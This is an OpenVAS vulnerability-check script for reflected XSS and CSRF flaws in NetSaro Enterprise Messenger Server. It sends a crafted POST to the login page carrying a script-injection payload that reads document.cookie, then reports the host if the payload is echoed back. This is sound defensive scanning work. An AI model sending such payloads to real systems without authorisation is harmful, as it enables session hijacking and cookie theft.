###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netsaro_messenger_server_mult_xss_n_csrf_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# NetSaro Enterprise Messenger Multiple XSS and CSRF Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow remote attackers to execute arbitrary
  script code within the users browser session in the security context of the
  target site and the attacker could gain access to users cookies (including
  authentication cookies).
  Impact Level: Application";
tag_affected = "NetSaro Enterprise Messenger Server version 2.0 and prior.";
tag_insight = "Multiple flaws are exists as the user supplied input received via various
  parameters is not properly sanitized. This can be exploited by submitting
  specially crafted input to the affected software.";
tag_solution = "No solution or patch is available as of 06th September, 2011. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://www.netsaro.com/";
tag_summary = "The host is running NetSaro Enterprise Messenger Server and is
  prone to multiple cross-site scripting and cross-site request forgery
  vulnerabilities.";

if(description)
{
  script_id(801971);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-07 08:36:57 +0200 (Wed, 07 Sep 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("NetSaro Enterprise Messenger Multiple XSS and CSRF Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.1337day.com/exploits/16809");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17766/");

  script_description(desc);
  script_summary("Check for cross-site scripting vulnerability in NetSaro Enterprise Messenger Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("General");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Check for the default port
port = get_http_port(default:4990);
if(!port){
  port = 4990;
}

## Check port status
if(!get_port_state(port)){
  exit(0);
}

## Send the request and receive response
sndReq = http_get(item:"/", port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

## Confirm the server
if("<title>NetSaro Administration Console</title>" >< rcvRes)
{
  ## Construct the crafted request
  authVariables = "username=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document"+
                  ".cookie%29%3C%2Fscript%3E&password=&login=Log+In&postback="+
                  "postback";

  sndReq1 = string("POST /login.nsp HTTP/1.1\r\n",
                   "Host: ", get_host_name(), "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                    authVariables);
  rcvRes1 = http_send_recv(port:port, data:sndReq1);

  ## Check for the response and confirm the exploit
  if("></script><script>alert(document.cookie)</script>" >< rcvRes1){
    security_warning(port);
  }
}
